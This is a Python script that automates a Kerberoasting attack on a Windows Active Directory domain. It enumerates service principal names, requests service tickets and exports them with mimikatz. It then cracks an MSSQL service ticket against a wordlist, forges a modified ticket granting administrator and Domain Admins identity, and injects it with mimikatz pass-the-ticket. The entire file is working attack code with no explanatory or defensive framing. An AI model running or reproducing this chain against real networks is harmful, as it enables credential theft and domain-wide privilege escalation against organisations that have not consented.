#-*- coding: utf-8 -*-

from os import system
import subprocess
from time import sleep
		
def proc1():
    system('setspn -T medin -Q */*')
    system('Add-Type -AssemblyName System.IdentityModel')
    system('setspn.exe -T medin.local -Q */* | Select-String \'^CN\' -Context 0,1 '
		   '| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '
           '$_.Context.PostContext[0].Trim()}')


def main():
    system("chcp 65001") # Установка кодировки Utf-8
    proc1()
    with subprocess.Popen(".\\mimikatz_trunk\\x64\\mimikatz.exe",
					  stdout=subprocess.PIPE,
					  stderr=subprocess.STDOUT,
					  stdin=subprocess.PIPE,
					  bufsize=0) as process:

        process.stdin.write(b"kerberos::list /export\n")
        sleep(0.3)
        process.stdin.close()
        process.kill()

    system('./kerberoast-master/tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi')
    system('./kerberoast-master/kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi'
           ' -w sql.kirbi -u 500  ')
    system('./kerberoast-master/kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi'
           ' -w sql.kirbi -g 512  ')

    with  subprocess.Popen(".\\mimikatz_trunk\\x64\\mimikatz.exe",
		stdout=subprocess.PIPE,
		stderr=subprocess.STDOUT,
		stdin=subprocess.PIPE,
		bufsize=0) as process:

        process.stdin.write(b"kerberos::ptt sql.kirbi\n")
        sleep(0.3)

        process.stdin.close()
        process.kill()